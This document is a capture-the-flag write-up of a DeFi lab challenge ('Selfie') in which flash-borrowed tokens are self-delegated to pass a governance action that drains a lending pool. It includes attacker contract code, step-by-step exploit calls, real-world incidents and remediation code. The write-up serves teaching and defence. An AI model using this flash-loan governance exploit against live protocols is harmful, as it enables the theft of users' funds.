# Challenge #4: Selfie

- **Difficulty**: Medium
- **Category**: Flash Loan Governance
- **Severity**: Critical
- **Status**: SOLVED

## Overview

A lending pool holds 1.5 million DVT tokens and is governed by a `SimpleGovernance` contract with a timelock. The DVT token implements `ERC20Votes`, meaning governance power is based on delegated voting snapshots. The governance contract has the authority to execute an `emergencyExit()` function on the pool, which transfers all funds to a designated receiver.

## Vulnerability

The governance system checks voting power at the time of proposal creation using `getVotes()`, which reads from ERC20Votes delegation snapshots. The critical flaw is that **flash-borrowed tokens can be delegated to gain temporary voting power**:

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

The check requires >50% of total supply in voting power. Since the pool holds 1.5M of 2M total DVT tokens, flash-borrowing the pool's tokens and self-delegating satisfies this threshold. The ERC20Votes standard updates voting power immediately upon `delegate()`, and the governance contract only checks power at proposal time — not at execution time.

## Exploit Walkthrough

**Step 1**: Deploy an attacker contract that implements `IERC3156FlashBorrower`:

```solidity
contract SelfieAttacker is IERC3156FlashBorrower {
    SimpleGovernance governance;
    SelfiePool pool;
    DamnValuableVotes token;
    uint256 public actionId;
    address recovery;
}
```

**Step 2**: Initiate a flash loan for the pool's entire token balance:

```solidity
pool.flashLoan(IERC3156FlashBorrower(this), address(token), pool.maxFlashLoan(address(token)), "");
```

**Step 3**: Inside the flash loan callback, delegate votes and queue the governance action:

```solidity
function onFlashLoan(address, address, uint256 amount, uint256, bytes calldata)
    external returns (bytes32) {
    token.delegate(address(this));
    bytes memory data = abi.encodeCall(pool.emergencyExit, (recovery));
    actionId = governance.queueAction(address(pool), 0, data);
    token.approve(address(pool), amount);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

**Step 4**: Wait for the timelock period (2 days) to elapse:

```solidity
vm.warp(block.timestamp + 2 days);
```

**Step 5**: Execute the queued governance action:

```solidity
governance.executeAction(actionId);
```

The pool's `emergencyExit()` is called by the governance timelock, transferring all 1.5M DVT to the recovery address.

## Real-World Impact

- **Beanstalk Farms (April 2022, ~$182M)**: The canonical real-world example. The attacker used a flash loan to acquire enough governance tokens to pass a malicious governance proposal in a single transaction, then executed it to drain the protocol. The attack vector is nearly identical to this challenge.
- **MakerDAO governance** has been analyzed for similar flash loan governance risks, leading to the implementation of governance delays and voting escrow mechanisms.
- **Compound's COMP token** governance uses time-weighted voting specifically to mitigate this class of attack.

## Remediation

```solidity
// Fix 1: Snapshot-based voting with time-weighted stakes
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getPastVotes(who, block.number - VOTING_DELAY);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}

// Fix 2: Require tokens to be locked for a minimum period before voting
mapping(address => uint256) public lockTimestamp;
require(block.timestamp - lockTimestamp[proposer] >= MIN_LOCK_PERIOD, "Not locked long enough");

// Fix 3: Flash loan guard - prevent delegation in same block as transfer
function delegate(address delegatee) public override {
    require(lastTransferBlock[msg.sender] < block.number, "Cannot delegate same block");
    super.delegate(delegatee);
}
```

## Key Takeaway

Governance systems must use historical snapshots for voting power — never instantaneous balances that flash loans can inflate.
